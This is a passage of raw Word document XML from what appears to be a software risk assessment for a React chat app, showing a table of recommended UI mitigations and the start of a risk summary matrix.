          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>react-scrollable-feed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> provides automatic smooth scrolling to the bottom of the message container. - Chakra UI provides consistent styled components with basic responsive layouts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8.5 Recommended Mitigation</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="autofit"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mitigation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Priority</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement Virtual Scrolling (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>react-window</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> or </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>@tanstack/react-virtual</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement Top-Level and Component-Level React Error Boundaries</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Add Global Connection Status Banner ("Connecting / Offline") via Socket.IO events</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Add Request In-Flight Lock / Debounce on message submission</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Decompose </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>ChatContext</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> and apply </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>React.memo</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> to prevent re-render cascades</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Add </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>word-break: break-word</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> and text overflow truncation guards</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9. Risk Summary Matrix</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>The following matrix provides a consolidated view of all 7 identified risk areas, their severity assessments, and current mitigation status:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="autofit"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1560"/>
        <w:gridCol w:w="1560"/>
        <w:gridCol w:w="1560"/>
        <w:gridCol w:w="1560"/>
        <w:gridCol w:w="1560"/>
        <w:gridCol w:w="1560"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>#</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Risk Area</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Likelihood</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Impact</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Current Mitigation Status</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Authentication &amp; Session Security</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
